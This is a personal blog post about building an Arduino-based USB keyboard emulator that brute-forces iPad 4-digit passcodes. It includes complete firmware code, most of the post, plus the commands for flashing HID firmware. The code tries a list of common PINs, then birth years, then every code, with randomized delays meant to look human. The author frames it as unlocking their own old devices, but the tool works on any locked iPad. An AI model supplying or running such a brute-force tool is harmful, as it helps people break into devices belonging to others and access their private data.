---
title: Arduino keyboard emulation
subtitle: Automate keyboard for fun and cracking codes
author: Pietro F. Maggi
date: 2023-08-20
meta: true
math: false
toc: false
draft: true
categories: 
  - "Personal"
  - "Arduino"
  - "Hacking"
hideDate: false
hideReadTime: false
---

Over the years I setup many iPads for friends and family members, updating my "customers" from a device to a newer one.

It is only natural that I ended up with a full set of obsolete, broken, and sometimes locked devices.

On internet there are devices on sales that automate the cracking of the device but they are quite expensive and it is much more fun to do it ourselves.
This is the cronicles of how to use and Arduino board as a keyboard entry device to try all the possible codes to unlock an iPad.

## Bill of Materials

Luckily I had everything available:

- Arduino board
- Simple display
- iPad Camera connection kit

## Where to find information

### A starting point

I found [this repository][1] with an application and some information about what you need to do. This was a good starting point and it pointed me in the right direction to get my small code setup.

I had a different display laying around, so I simplified the code to display the current pin code, but it was unvaluable to understand that I needed a different firmware on the Arduino board so that it could act as a USB HID device; a keyboard.

### The code

The code I ended up using is heavily based on the one on the [iPeeU][1] repository:

{{< highlight cpp "linenos=table" >}}
// include the library code
#include <Wire.h>
#include <LiquidCrystal_I2C.h>

//These values usually need to be altered
//to specifiy your own search criterium
//Do you want to try some specific PINs first?
#define doFirst TRUE
//some PINs you'd like to try first
const int doFirstValues[] = { 1234, 1111, 0000, 1212, 7777, 1004,
                              2000, 4444, 2222, 6969, 9999, 3333, 5555,
                              6666, 1122, 1313, 8888, 4321, 2001, 1010
                            };

//show we try doing dates before going into NORMAL mode?
#define doDate TRUE
//The lowest year in DATE mode
#define DATE_RANGE_LOWER 1950
//The highest year in DATE mode
#define DATE_RANGE_UPPER 2023

//the value to start at in NORMAL mode
#define START_VALUE 0000

//These values are the minimum and maximum
//time (ms) between individual keypresses
//Note: not between PIN codes
#define DELAY_BETWEEN_KEYPRESS_MIN 200
#define DELAY_BETWEEN_KEYPRESS_MAX 400

//the length of time (ms) each key is
//held down for
#define KEYPRESS_LENGTH 100

//These values are the minimum and maximum
//delay (ms) between each PIN, note this
//should be at least 80 for older OS/hardware
//and 5000 for newer OS/hardware
#define BETWEEN_PIN_DELAY_MIN 6000
#define BETWEEN_PIN_DELAY_MAX 7000

//These values are usually best left as
//they are, but can be altered if need be
//NOTE: keycodes are for USB keyboards
//and can be found at:
//https://www.win.tue.nl/~aeb/linux/kbd/scancodes-14.html
//the USB keyscan code for the return key
#define RETURN_KEY 40
//the USB keyscan code for the backspace key
#define BACKSPACE_KEY 42
//the USB keyscan code for the Escape key
#define ESCAPE_KEY 41
//the USB keyscan code for the TAB key
#define TAB_KEY 43
//the pin the LED to flash is on
#define LED_PIN 13
//The highest ever value for a PIN in NORMAL mode
#define LIMIT 9999
//this says how many back spaces it will
//take to ALWAYS clear any keys already
//entered in as a pin
#define CLEAR_COUNT 4

//These values should NOT be altered
//at all, as doing so will cause the
//program to malfunction
#define TRUE 1
#define FALSE 0
int thousands = 0;
int hundreds = 0;
int tens = 0;
int units = 0;
int mode = 0;
#define MODE_DOFIRST 1
#define MODE_DATE 2
#define MODE_NORMAL 3

//Keyboard report buffer
uint8_t buf[8] = {
  0
};

char charDigit[8];

// Return the size of an array
#define arr_len( x )  ( sizeof( x ) / sizeof( *x ) )

// initialize the library with the numbers of the interface pins
LiquidCrystal_I2C lcd(0x27, 16, 2); // set the LCD address to 0x27 for a 16 chars and 2 line display
#define LCD_DELAY (5)

void setup() {
  //keyboard set up
  Serial.begin(9600);
  randomSeed(analogRead(0));
  delay(200);

  //led setup
  pinMode(LED_PIN, OUTPUT);

  // LCD setup
  lcd.init();  //initialize the lcd
  lcd.backlight();  //open the backlight

}

void loop() {
  if (doFirst == TRUE)
  {
    mode = MODE_DOFIRST;

    if (arr_len(doFirstValues) > 0)
    {
      for (int i = 0; i < arr_len(doFirstValues); i++)
      {
        processPIN(doFirstValues[i]);
      }//for (int i = 0; i < arr_len(doFirstValues); i++)
    }//if (arr_len(doFirstValues) > 0)
  }//if (doFirst == TRUE)

  if (doDate == TRUE)
  {
    mode = MODE_DATE;
    for (int i = DATE_RANGE_LOWER; i <= DATE_RANGE_UPPER; i++)
    {
      processPIN(i);
    }//for (int i=DATE_RANGE_LOWER; i<= DATE_RANGE_UPPER; i++)
  }//if (doDate == TRUE)

  //main loop
  for (int value = START_VALUE; value <= LIMIT; value++)
  {
    mode = MODE_NORMAL;
    int breakOut = FALSE;

    if (doFirst == TRUE)
    {
      //only bother if there are any
      if (arr_len(doFirstValues) > 0)
      {
        for (int i = 0; i < arr_len(doFirstValues); i++)
        {
          //check for match, if so, break
          if (value == doFirstValues[i])
          {
            breakOut = TRUE;
            break;
          }//if (value == doFirstValues[i])
        }//for (int i=0; i<arr_len(doFirstValues); i++)
      }//if (arr_len(doFirstVelues) > 0)
    }//if (doFirst == TRUE)

    if ((value >= DATE_RANGE_LOWER) && (value <= DATE_RANGE_UPPER) && (doDate == TRUE))
    {
      breakOut = TRUE;
    }//if ((value => DATE_RANGE_LOWER) || (value <= DATE_RANGE_UPPER) && (doDate == TRUE))

    //check to see if we have a reason to not check this value, and continue on
    if (breakOut == TRUE)
    {
      continue;
    }//if (breakOut == TRUE)

    processPIN(value);
  }//for (value = 0; value <= LIMIT; value++)
}

void processPIN(int pin)
{
  int firstDigit = (int)(pin / 1000);
  int secondDigit = (int)(pin % 1000 / 100);
  int thirdDigit = (int)(pin % 100 / 10);
  int fourthDigit = (int)(pin % 10);

  //pressing tab to start with seems to help
  pressKey(ESCAPE_KEY, 0);
  pressKey(TAB_KEY, 0);
  //press thekeys, but first
  //make sure that any numbers
  //already entered are removed
  for ( int delLoop = 0; delLoop < CLEAR_COUNT; delLoop++)
  {
    pressKey(BACKSPACE_KEY, 0);
  }
  pressKey(firstDigit, 1);
  pressKey(secondDigit, 2);
  pressKey(thirdDigit, 3);
  pressKey(fourthDigit, 4);
  pressKey(RETURN_KEY, 0);

  //output to LCD display
  lcd.setCursor(0, 0);
  lcd_print("PIN: ");
  delay(LCD_DELAY);
  charDigit[0] = firstDigit + 48;
  charDigit[1] = secondDigit + 48;
  charDigit[2] = thirdDigit + 48;
  charDigit[3] = fourthDigit + 48;
  charDigit[4] = 0x00;
  lcd.setCursor(5, 0);
  lcd_print(charDigit);
  delay(LCD_DELAY);

  switch (mode)
  {
    case MODE_DOFIRST: {
        lcd.setCursor(0, 1);
        lcd_print("MODE: First   ");
        delay(LCD_DELAY);
        break;
      }
    case MODE_DATE: {
        lcd.setCursor(0, 1);
        lcd_print("MODE: Date    ");
        delay(LCD_DELAY);
      }
      break;
    case MODE_NORMAL: {
        lcd.setCursor(0, 1);
        lcd_print("MODE: Normal  ");
        delay(LCD_DELAY);
      }
      break;
  }

  //create a random delay to look like a human, this is delay before trying a new pin again
  //remeber must be higher than at least 80ms or maybe even 5sec
  long randomDelay = random(BETWEEN_PIN_DELAY_MIN, BETWEEN_PIN_DELAY_MAX);
  delay(randomDelay);
}//void processPIN(int pin)

void releaseKey()
{
  buf[0] = 0;
  buf[2] = 0;
  Serial.write(buf, 8);  // Release key
}//void releaseKey()

void pressKey(int digit, int pos)
{
  const int keys[10] = { 39, 30, 31, 32, 33, 34, 35, 36, 37, 38  };
  //light LED to show button press process is working
  digitalWrite(LED_PIN, HIGH);

  //do the actual button press
  //compensate fot return key
  if ((digit != RETURN_KEY) && (digit != BACKSPACE_KEY) && (digit != TAB_KEY) && (digit != ESCAPE_KEY))
  {
    buf[2] = keys[digit];
  }
  else if (digit == RETURN_KEY)
  {
    buf[2] = RETURN_KEY;
  }
  else
  {
    buf[2] = BACKSPACE_KEY;
  }

  Serial.write(buf, 8);
  delay(KEYPRESS_LENGTH);
  releaseKey();

  //button press process over, turn off LED to show this
  digitalWrite(LED_PIN, LOW);

  //put a random delay to look human
  long randomDelay = random(DELAY_BETWEEN_KEYPRESS_MIN, DELAY_BETWEEN_KEYPRESS_MAX);
  delay(randomDelay);
  //delay(500);
}//void pressKey

void lcd_print(const char* buf) {
  int len = strlen(buf);
  for (int i = 0; i < len; i++) {
    lcd.write(buf[i]);
    delay(LCD_DELAY);
  }
}
{{</ highlight >}}

### Keyboard firmware

The standard firware on arduino boards setup the USB connection as a serial communication channel. We need to change that!

[This article][2] is the clearest explanation about what to do, but the linked firmware are not anymore available...

Luckly I've found them on [on this other article][3].
Once downloaded the two firmwares
{{< sidenote >}}
as you also want the standard one, to be able to revert your Arduino to the standard behaviour and be able to update the code on it.
{{</ sidenote >}}
you can test reprogram its atmega16u2 on the Arduino board to act as a keyboard.

Depending on the OS you are using you may need to follow different steps. With my hacking OS of choice (GNU/Linux - Manjaro) I can rely on `pacman` to install the `dfu-programmer` application:

{{< highlight shell "linenos=table" >}}
$> sudo pacman -S dfu-programmer
{{</ highlight >}}

And then test the standard firmware, just to be sure that everything is working correctly.
{{< sidenote >}}
First you may need to reset the ATmega16u2 shorting the topleft jumper.
{{</ sidenote >}}

{{< highlight shell "linenos=table" >}}
$> sudo dfu-programmer at90mega16u2 erase
$> sudo dfu-programmer at90mega16u2 flash --debug 1 ./Arduino-usbserial-atmega16u2-Uno-Rev3.hex
$> sudo dfu-programmer at90mega16u2 reset
{{</ highlight >}}

If power cycling the USB connection the board can be seen correctly by the Arduino IDE, we are good to go to program the keyboard firmware:

{{< highlight shell "linenos=table" >}}
$> sudo dfu-programmer at90mega16u2 erase
$> sudo dfu-programmer at90mega16u2 flash --debug 1 ./Arduino-keyboard-0.3.hex
$> sudo dfu-programmer at90mega16u2 reset
{{</ highlight >}}

Now we just have to connect the Arduino board with the iPad using the camera kit and be patient.

[1]: https://github.com/ajw107/iPeeU
[2]: https://mitchtech.net/arduino-usb-hid-keyboard/
[3]: https://techtotinker.com/2020/07/tutorial-how-to-use-arduino-uno-as-hid-part-1-arduino-keyboard-emulation/
